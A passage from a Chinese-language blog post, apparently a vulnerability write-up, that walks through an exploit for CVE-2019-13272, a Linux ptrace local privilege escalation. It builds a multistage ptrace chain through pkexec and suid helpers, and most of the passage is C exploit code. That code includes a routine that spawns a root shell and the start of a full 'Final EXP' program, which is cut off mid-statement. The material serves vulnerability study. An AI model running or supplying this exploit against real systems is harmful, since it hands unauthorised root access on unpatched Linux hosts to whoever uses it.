<p>重定向完成后便是常规的执行 <code>pkexec</code> 的流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    self_fd = open(<span class="string">&quot;/proc/self/exe&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> =</span> getpwuid(getuid());</span><br><span class="line">    pid_task_b = getpid();</span><br><span class="line"></span><br><span class="line">    pid_task_c = fork();</span><br><span class="line">    <span class="keyword">if</span> (!pid_task_c)</span><br><span class="line">        <span class="keyword">return</span> finalPtracee();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[+] Task B fork out task C.\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[*] Task B execve pkexec soooon...\n&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    dup2(self_fd, <span class="number">0</span>); <span class="comment">// got stdin close</span></span><br><span class="line">    dup2(pipe_for_block[<span class="number">1</span>], <span class="number">1</span>); <span class="comment">// redirect stdout to block it</span></span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, basename(<span class="string">&quot;/usr/bin/pkexec&quot;</span>), <span class="string">&quot;--user&quot;</span>, pw-&gt;pw_name, helper, <span class="string">&quot;--helper&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrive there, we failed.</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to execve pkexec!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Step-III-task-C-get-root"><a href="#Step-III-task-C-get-root" class="headerlink" title="Step.III task C get root"></a>Step.III task C get root</h3><p>task B 执行 pkexec 之后会提权到 root，当 task C 监视到 task B 执行 pkexec 后便调用 <code>ptrace(PTRACE_TRACEME, 0, NULL, NULL)</code> 来获取 task B 的 root cred，<strong>从而令 task C 的 ptracer_cred 为 root cred</strong>，此时 task C 再执行一个 suid 程序便能以 root 权限执行，<strong>且仍保持着被 task B ptrace 的状态</strong></p>
<p>这里我们选择执行 <code>/usr/bin/passwd</code>，因为其会等待用户输入而不会直接退出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// task C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    pid_task_c = getpid();</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">char</span> needle[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">char</span> uid_buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> task_B_status_fd;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(needle, <span class="string">&quot;/proc/%d/status&quot;</span>, pid_task_b);</span><br><span class="line">    <span class="built_in">sprintf</span>(uid_buf, <span class="string">&quot;Uid:\t%d\t0\t&quot;</span>, getuid());</span><br><span class="line">    dup2(self_fd, <span class="number">114</span>);</span><br><span class="line">    task_B_status_fd = open(needle, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (task_B_status_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;[x] Failed to get status of task B!&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check out uid of task B</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[pread(task_B_status_fd, buf, <span class="number">0x1000</span> - <span class="number">1</span>, <span class="number">0</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, uid_buf)) <span class="comment">// task B got root</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let task B(root) be ptracer</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Task B is root now!&quot;</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Task C execve another suid programme sooooon...&quot;</span>);</span><br><span class="line">    execl(<span class="string">&quot;/usr/bin/passwd&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we arrived there, execve failed </span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Task C failed to execve!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Step-IV-task-A-attach-task-B"><a href="#Step-IV-task-A-attach-task-B" class="headerlink" title="Step.IV task A attach task B"></a>Step.IV task A attach task B</h3><p>task A 在 fork 出 task B 之后便持续监视 task B 的状态，当 task B 执行 helper 时<strong>说明 task B 已经降权并阻塞，此时 task A 便有足够的权限 ptrace task B</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/comm&quot;</span>, pid_task_b);</span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="type">char</span> comm[<span class="number">0x100</span>];</span><br><span class="line">       <span class="type">int</span> comm_fd = open(buf, O_RDONLY);</span><br><span class="line">       <span class="keyword">if</span> (comm_fd &lt; <span class="number">0</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Failed to read comm of task B!\n&quot;</span>);</span><br><span class="line">           <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">       &#125;</span><br><span class="line">       comm[read(comm_fd, comm, <span class="number">0x100</span> - <span class="number">1</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">       <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(comm, helper_basename, <span class="number">10</span>))</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       usleep(<span class="number">100000</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// task B got the root, wait a while it&#x27;ll lose privilege, then task A attach to it</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;[*] Task A attaching to task B soooon...&quot;</span>);</span><br><span class="line">   ptrace(PTRACE_ATTACH, pid_task_b, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   waitpid(pid_task_b, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">// 0 means no extra options</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<h3 id="Step-V-get-privileged-by-multistage-ptrace-link"><a href="#Step-V-get-privileged-by-multistage-ptrace-link" class="headerlink" title="Step.V get privileged by multistage ptrace link"></a>Step.V get privileged by multistage ptrace link</h3><p>当程序运行到这一步时，<strong>我们已经成功建立了</strong> <code>task A -&gt; task B -&gt; task C</code> <strong>这一多级 ptrace 链条</strong>，此时 task A、B 为用户权限，task C 为 root 权限，<strong>而 task C 保存的 ptracer_cred 同为 root 权限</strong>，因此我们可以通过 task A 控制 task B 控制 task C 来完成提权</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// in task A</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// force the task B to execve stage2</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Forcing task B to execve stage2...&quot;</span>);</span><br><span class="line">    forceChildToExecve(pid_task_b, <span class="number">0</span>, <span class="string">&quot;stage2&quot;</span>);</span><br><span class="line">    <span class="comment">//force_exec_and_wait(pid_task_b, 0, &quot;stage2&quot;);</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> child = waitpid(<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    forceChildToExecve(child, <span class="number">114</span>, <span class="string">&quot;stage3&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// task again C</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用到了一个自行编写的 <code>forceChildToExecve()</code> 函数，主要是控制 ptracee 进程通过 execveat 系统调用执行回 exp 程序的不同入口，具体细节参见注释，这里不再赘叙</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// force a child to execve by ptrace through execveat syscall</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> </span><br><span class="line">    &#123;</span><br><span class="line">        .iov_base = &amp;regs,</span><br><span class="line">        .iov_len = <span class="keyword">sizeof</span>(regs),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> child_stack;</span><br><span class="line">    <span class="type">size_t</span> insert_data[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SYSCALL, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>); <span class="comment">// wait for child meeting a syscall</span></span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);    <span class="comment">// wait for child to execve</span></span><br><span class="line">    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &amp;iov); <span class="comment">// get env of child</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// prepare the stack data</span></span><br><span class="line">    child_stack = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL; </span><br><span class="line">    <span class="built_in">memset</span>(insert_data, <span class="number">0</span>, <span class="keyword">sizeof</span>(insert_data));</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = child_stack + <span class="number">0x18</span>;    <span class="comment">// argv arrays</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;</span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// env arrays</span></span><br><span class="line">    insert_data[idx++] = *(<span class="type">size_t</span>*)argv;          <span class="comment">// argv[0]</span></span><br><span class="line">    insert_data[idx++] = <span class="number">0</span>;                     <span class="comment">// path</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// copy to child stack</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++)</span><br><span class="line">        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * <span class="keyword">sizeof</span>(<span class="type">size_t</span>), insert_data[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execveat(exec_fd, NULL, argv, NULL, flags)</span></span><br><span class="line">    regs.orig_rax = __NR_execveat;</span><br><span class="line">    regs.rdi = exec_fd;</span><br><span class="line">    regs.rsi = child_stack + <span class="number">0x20</span>;  <span class="comment">// path -&gt; NULL</span></span><br><span class="line">    regs.rdx = child_stack;         <span class="comment">// argv -&gt; &quot;stagex&quot;, NULL</span></span><br><span class="line">    regs.r10 = child_stack + <span class="number">0x10</span>;  <span class="comment">// envp -&gt; NULL</span></span><br><span class="line">    regs.r8  = AT_EMPTY_PATH;       <span class="comment">// flags</span></span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &amp;iov);</span><br><span class="line">    ptrace(PTRACE_DETACH, child_pid, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(child_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final EXP"></a>Final EXP</h3><p>最终的 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pwd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_list[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/sbin/mate-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/xfpm-power-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/bin/lxqt-backlight_backend&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/libexec/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-backlight-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-led-helper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/usr/lib/gsd-wacom-oled-helper&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *helper_basename = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pipe_for_block[<span class="number">2</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> self_fd;</span><br><span class="line"><span class="type">pid_t</span> pid_task_b;</span><br><span class="line"><span class="type">pid_t</span> pid_task_c;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">findHelper</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middleStage</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">middlePtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">finalPtracee</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">forceChildToExecve</span><span class="params">(<span class="type">pid_t</span> child_pid, <span class="type">int</span> exec_fd, <span class="type">char</span> *argv)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mainly for task a, and jmp for stage 2 and 3</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage2&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> middleStage();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;stage3&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> getRootShell();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] CVE-2019-13272 POC of local privileged.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Written by arttnba3.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start exploiting...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the helper</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Finding the helper...&quot;</span>);</span><br><span class="line">    helper = findHelper();</span><br><span class="line">    helper_basename = basename(helper);</span><br><span class="line">    <span class="keyword">if</span> (!helper)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[x] Unable to find suitable helper on your platform!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Using helper: %s\n&quot;</span>, helper);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create the pipe for blocking child</span></span><br><span class="line">    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); <span class="comment">// set the pipe in packet mode, which meant that the data should be received in packets</span></span><br><span class="line">    fcntl(pipe_for_block[<span class="number">0</span>], F_SETPIPE_SZ, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_for_block[<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>); <span class="comment">// temp packet to make the following ones stuck, the stdout of task B will be redirect to it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fork out task B</span></span><br><span class="line">    <span class="comment">// two kinds of writing, all OK</span></span><br><span class="line">    <span class="comment">// pid_task_b = clone(middlePtracee, (size_t)malloc(0x1000 * 100) + 0x1000 * 100, CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);</span></span><br><span class="line">    pid_task_b = 